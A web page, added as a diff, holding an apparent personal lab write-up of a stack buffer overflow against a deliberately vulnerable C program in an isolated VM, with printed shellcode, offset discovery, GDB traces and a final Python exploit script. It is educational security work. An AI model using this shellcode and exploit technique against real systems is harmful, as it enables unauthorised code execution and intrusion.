@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 4 – Stack Shellcode Injection</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+<div class="container">
+  <h1 id="lab-4">💉 Red Team Lab Report: Stack Shellcode Injection via Vulnerable C Program</h1>
+  <p><strong>Author:</strong> Alexander Nichols<br>
+     <strong>Date:</strong> July 8th, 2025<br>
+     <strong>Platform:</strong> Kali Linux (x86_64 with 32-bit support)<br>
+     <strong>Category:</strong> Red Team Development / Exploit Engineering<br>
+     <strong>Objective:</strong> Achieve shell access by injecting shellcode into a stack buffer and redirecting execution in a vulnerable binary. Document every step, debug trace, and breakthrough in the exploit development process.
+  </p>
+
+  <p><strong>TL;DR:</strong> Leveraged a classic stack buffer overflow in a 32-bit non-PIE, non-NX binary to inject shellcode and hijack EIP. Verified offset using Metasploit tools, inspected memory via GDB, adjusted return addresses into the NOP sled, and used stdin redirection to maintain shell interactivity. Final payload successfully executed an interactive /bin/sh shell.</p>
+  <hr>
+
+  <h2>🧽 Overview</h2>
+  <p>On paper, this lab was classic: exploit a stack buffer overflow to inject shellcode and hijack execution. But theory quickly gave way to trench warfare — return addresses misaligned by a byte, stacks shifting in GDB, and perfectly formed payloads failing silently. This exercise became a deep-dive into <strong>real-world exploit tuning</strong>, where success was earned through controlled chaos and methodical testing.</p>
+  <hr>
+
+  <h2>🧰 Environment Setup</h2>
+  <table>
+    <tr><td><strong>System</strong></td><td>Kali Linux 2025.2 (x86_64 with multilib)</td></tr>
+    <tr><td><strong>Key Tools</strong></td><td><code>gcc -m32</code>, <code>gdb + pwndbg</code>, <code>Metasploit pattern_create/offset</code>, <code>Python3</code></td></tr>
+    <tr><td><strong>Compiler Options</strong></td><td><code>-m32 -fno-stack-protector -z execstack -no-pie</code></td></tr>
+    <tr><td><strong>Binary Protections Bypassed</strong></td><td>NX, Stack Canaries, PIE</td></tr>
+  </table>
+  <pre><code class="language-bash">checksec --file=./vuln
+# RELRO           => No RELRO
+# Stack canary    => No canary found
+# NX              => NX disabled
+# PIE             => No PIE (0x8048000)</code></pre>
+  <p>We verified these mitigations were disabled, enabling reliable code injection and address reuse.</p>
+  <hr>
+
+  <h2>📄 Vulnerable Program</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vulnerable() {
+    char buffer[100];
+    gets(buffer); // 💥 classic overflow
+}
+
+int main() {
+    printf("Input: ");
+    vulnerable();
+    return 0;
+}</code></pre>
+<p><strong>Compiled with:</strong></p>
+<pre><code class="language-bash">gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln</code></pre>
+<p><strong>⚠️ Note:</strong> <code>gets()</code> has been removed from modern libc for being inherently unsafe. It's included here intentionally to demonstrate legacy exploit techniques.</p>
+<hr>
+
+<h2>🚀 Shellcode Test</h2>
+<pre><code class="language-c">char shellcode[] =
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+  "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+  "\x53\x89\xe1\xb0\x0b\xcd\x80";
+((void(*)())shellcode)();</code></pre>
+<pre><code class="language-bash">gcc -m32 -fno-stack-protector -z execstack run_shellcode.c -o shellrun
+./shellrun
+# whoami → shell-user ✅</code></pre>
+<p>✅ Shellcode confirmed functional and stable.</p>
+<hr>
+
+<h2>🎯 Offset Discovery</h2>
+<pre><code class="language-bash">msf-pattern_create -l 200 > pattern.txt
+cat pattern.txt | ./vuln
+# EIP = 0x41336541
+msf-pattern_offset -l 200 -q 41336541
+# → Offset = 129</code></pre>
+<p>We now control EIP at byte 129. Time to aim it.</p>
+<hr>
+
+<h2>🚨 Failed Exploits & Dead Ends</h2>
+<p>We crafted a classic payload: NOP sled, shellcode, and a guessed return address (EIP → shellcode). The binary? Clean exit. No crash, no shell.</p>
+<pre><code class="language-python">payload = b"\x90" * (129 - 23) + shellcode + struct.pack("&lt;I", 0xffffce84)</code></pre>
+<pre><code class="language-bash">python3 exploit.py > input.txt
+./vuln < input.txt
+# Nothing. Just exit.</code></pre>
+<p>This silent fail hinted at a mismatched EIP target. Time to trace harder.</p>
+<hr>
+
+<h2>🔌 System() Probe: Control Flow Check</h2>
+<pre><code class="language-c">scanf("%s", buffer);
+system("/bin/sh");  // Temp debug line</code></pre>
+<pre><code class="language-bash">./vuln
+Input: hello
+# → Got a shell
+./vuln < input.txt
+# → No shell ⇒ execution diverted pre-system()</code></pre>
+<p>💡 Confirmed: we overwrote EIP, but it <em>didn’t</em> jump to our shellcode. Stack misalignment suspected.</p>
+<hr>
+
+<h2>🤠 Stack Inspection via GDB</h2>
+<pre><code class="language-bash">gdb ./vuln
+break vulnerable
+run < input.txt
+x/128xb $esp</code></pre>
+<ul>
+  <li>Shellcode visible at <code>0xffffce7f</code></li>
+  <li>Tried offsets: <code>0xffffce84</code>, <code>0xffffce80</code>, <code>0xffffce7f</code>, <code>0xffffce82</code></li>
+  <li>All returned silently — no crash, no shell</li>
+</ul>
+<p>After examining <code>$esp</code> via GDB, we saw shellcode near <code>0xffffce7f</code>. We chose this as our EIP target, placing it within a generous NOP sled to account for slight stack shifts.</p>
+<hr>
+
+<h2>🔮 Breakthrough: Input Redirection vs. Interactive Shell</h2>
+<pre><code class="language-bash">(cat input.txt; cat) | ./vuln
+# ✅ Got a shell</code></pre>
+<p>The shell <em>was</em> executing but died instantly due to closed <code>stdin</code>. This redirection preserved interactivity and confirmed exploit success.</p>
+<blockquote><strong>Lesson:</strong> Clean exit does not mean exploit failure. Debug input streams and interaction assumptions.</blockquote>
+<hr>
+
+<h2>✅ Final Exploit</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import struct, sys
+
+shellcode = (
+  b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+  b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+  b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+offset = 129
+ret_addr = 0xffffce7f
+eip = struct.pack("<I", ret_addr)
+nop_sled = b"\x90" * (offset - len(shellcode))
+payload = nop_sled + shellcode + eip
+
+sys.stdout.buffer.write(payload)</code></pre>
+<pre><code class="language-bash">python3 exploit.py > input.txt
+(cat input.txt; cat) | ./vuln
+# whoami → shell-user</code></pre>
+<p>💥 Shell achieved. On our terms.</p>
+
+<pre><code class="language-text">[ Payload Layout ]
+
+|---------------------------|  ← esp
+|  NOP sled (padding)       |  (≈ 106 bytes)
+|---------------------------|
+|  Shellcode (23 bytes)     |  (execve("/bin/sh"))
+|---------------------------|
+|  EIP overwrite            |  (→ 0xffffce7f)
+|---------------------------|</code></pre>
+<hr>
+
+<h2>🧐 Key Insights</h2>
+<ul>
+  <li>💡 Shell execution may silently succeed — inspect behavior post-EIP</li>
+  <li>💡 Interactive shell requires open <code>stdin</code></li>
+  <li>💡 Return address fuzzing benefits from large NOP sleds</li>
+  <li>💡 Use <code>system()</code> as a flow check when debugging</li>
+  <li>💡 GDB stack inspection is essential for shellcode location</li>
+</ul>
+<hr>
+
+<h2>✅ Skills Demonstrated</h2>
+<ul>
+  <li>✅ Shellcode crafting & testing</li>
+  <li>✅ Buffer overflow exploitation (stack-based)</li>
+  <li>✅ EIP control & return address tuning</li>
+  <li>✅ GDB + pwndbg memory inspection</li>
+  <li>✅ Interactive shell recovery via stdin</li>
+  <li>✅ Real-world exploit troubleshooting tactics</li>
+</ul>
+<hr>
+
+<h2>🚀 Next Labs</h2>
+<ul>
+  <li>Ret2libc with <code>system("/bin/sh")</code></li>
+  <li>ROP chain exploitation</li>
+  <li>Stack exploitation over network sockets</li>
+  <li>Chained vulns for escalation</li>
+</ul>
+<hr>
+
+<p><em>All work performed in an isolated Kali VM. Curious to dive deeper? <a href="https://www.linkedin.com/in/alnich1/" target="_blank">Let’s connect</a>.</em></p>
+<p><a href="labs.html">⬅️ Back to Labs</a></p>
+</div>
+
+<button id="mode-toggle">🌙</button>
+<script src="assets/js/darkmode.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
